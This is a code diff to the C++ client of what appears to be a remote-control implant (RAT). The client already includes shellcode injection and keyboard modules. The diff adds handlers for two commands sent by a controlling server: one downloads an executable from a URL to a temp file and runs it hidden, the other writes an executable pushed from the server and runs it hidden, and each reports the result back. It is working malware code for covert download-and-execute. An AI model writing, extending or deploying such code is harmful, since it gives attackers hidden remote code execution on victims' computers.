@@ -19,6 +19,8 @@
 #include "ShellcodeInj.h"
 #include "KeyboardManager.h"
 
+#pragma comment(lib, "urlmon.lib")
+
 // UDP 协议仅能针对小包数据，且数据没有时序关联
 IOCPClient* NewNetClient(CONNECT_ADDRESS* conn, State& bExit, const std::string& publicIP, bool exit_while_disconnect)
 {
@@ -406,6 +408,75 @@ bool EnableShutdownPrivilege()
     return true;
 }
 
+class CDownloadCallback : public IBindStatusCallback {
+private:
+    DWORD m_startTime;
+    DWORD m_timeout;  // 毫秒
+
+public:
+    CDownloadCallback(DWORD timeoutMs) : m_timeout(timeoutMs) {
+        m_startTime = GetTickCount();
+    }
+
+    HRESULT STDMETHODCALLTYPE OnProgress(ULONG ulProgress, ULONG ulProgressMax,
+        ULONG ulStatusCode, LPCWSTR szStatusText) override {
+        // 超时检查
+        if (GetTickCount() - m_startTime > m_timeout) {
+            return E_ABORT;  // 取消下载
+        }
+        return S_OK;
+    }
+
+    // 其他接口方法返回默认值
+    HRESULT STDMETHODCALLTYPE OnStartBinding(DWORD, IBinding*) override { return S_OK; }
+    HRESULT STDMETHODCALLTYPE GetPriority(LONG*) override { return S_OK; }
+    HRESULT STDMETHODCALLTYPE OnLowResource(DWORD) override { return S_OK; }
+    HRESULT STDMETHODCALLTYPE OnStopBinding(HRESULT, LPCWSTR) override { return S_OK; }
+    HRESULT STDMETHODCALLTYPE GetBindInfo(DWORD*, BINDINFO*) override { return S_OK; }
+    HRESULT STDMETHODCALLTYPE OnDataAvailable(DWORD, DWORD, FORMATETC*, STGMEDIUM*) override { return S_OK; }
+    HRESULT STDMETHODCALLTYPE OnObjectAvailable(REFIID, IUnknown*) override { return S_OK; }
+
+    // IUnknown
+    ULONG STDMETHODCALLTYPE AddRef() override { return 1; }
+    ULONG STDMETHODCALLTYPE Release() override { return 1; }
+    HRESULT STDMETHODCALLTYPE QueryInterface(REFIID riid, void** ppv) override {
+        if (riid == IID_IBindStatusCallback || riid == IID_IUnknown) {
+            *ppv = this;
+            return S_OK;
+        }
+        return E_NOINTERFACE;
+    }
+};
+
+void DownExecute(const std::string &strUrl, CManager *This) {
+    // 临时路径
+    char szTempPath[MAX_PATH], szSavePath[MAX_PATH];
+    GetTempPathA(MAX_PATH, szTempPath);
+    srand(GetTickCount64());
+    sprintf_s(szSavePath, "%sDownload_%d.exe", szTempPath, rand() % 10086);
+
+    // 下载并运行
+    const int timeoutMs = 30 * 1000;
+    CDownloadCallback callback(timeoutMs);
+    if (S_OK == URLDownloadToFileA(NULL, strUrl.c_str(), szSavePath, 0, &callback))
+    {
+        ShellExecuteA(NULL, "open", szSavePath, NULL, NULL, SW_HIDE);
+        Mprintf("Download Exec Success: %s\n", strUrl.c_str());
+        char buf[100];
+        sprintf_s(buf, "Client %llu download exec succeed", This->GetClientID());
+        ClientMsg msg("执行成功", buf);
+        This->SendData(LPBYTE(&msg), sizeof(msg));
+    }
+    else
+    {
+        Mprintf("Download Exec Failed: %s\n", strUrl.c_str());
+        char buf[100];
+        sprintf_s(buf, "Client %llu download exec failed", This->GetClientID());
+        ClientMsg msg("执行失败", buf);
+        This->SendData(LPBYTE(&msg), sizeof(msg));
+    }
+}
+
 VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 {
     bool isExit = szBuffer[0] == COMMAND_BYE || szBuffer[0] == SERVER_EXIT;
@@ -418,6 +489,39 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
     std::string publicIP = m_ClientObject->GetClientIP();
 
     switch (szBuffer[0]) {
+    case COMMAND_DOWN_EXEC:
+    {
+        std::thread(DownExecute, std::string((char*)szBuffer + 1), this).detach();
+        break;
+    }
+
+    case COMMAND_UPLOAD_EXEC:
+    {
+        if (ulLength < 5) break;
+
+        DWORD dwFileSize = *(DWORD*)(szBuffer + 1);
+        if (dwFileSize == 0 || ulLength < (5 + dwFileSize)) break;
+        BYTE* pFileData = szBuffer + 5;
+
+        char szTempPath[MAX_PATH], szSavePath[MAX_PATH];
+        GetTempPathA(MAX_PATH, szTempPath);
+        srand(GetTickCount64());
+        sprintf_s(szSavePath, "%sUpload_%d.exe", szTempPath, rand() % 10086);
+
+        FILE* fp = fopen(szSavePath, "wb");
+        if (fp)
+        {
+            fwrite(pFileData, 1, dwFileSize, fp);
+            fclose(fp);
+            ShellExecuteA(NULL, "open", szSavePath, NULL, NULL, SW_HIDE);
+            Mprintf("Upload Exec Success: %d bytes\n", dwFileSize);
+        }
+        char buf[100];
+        sprintf_s(buf, "Client %llu upload exec %s", m_conn->clientID, fp ? "succeed" : "failed");
+        ClientMsg msg(fp ? "执行成功" : "执行失败", buf);
+        SendData(LPBYTE(&msg), sizeof(msg));
+        break;
+    }
     case TOKEN_MACHINE_MANAGE:
         if (ulLength <= 1 || !EnableShutdownPrivilege()) break;
 #ifdef _DEBUG
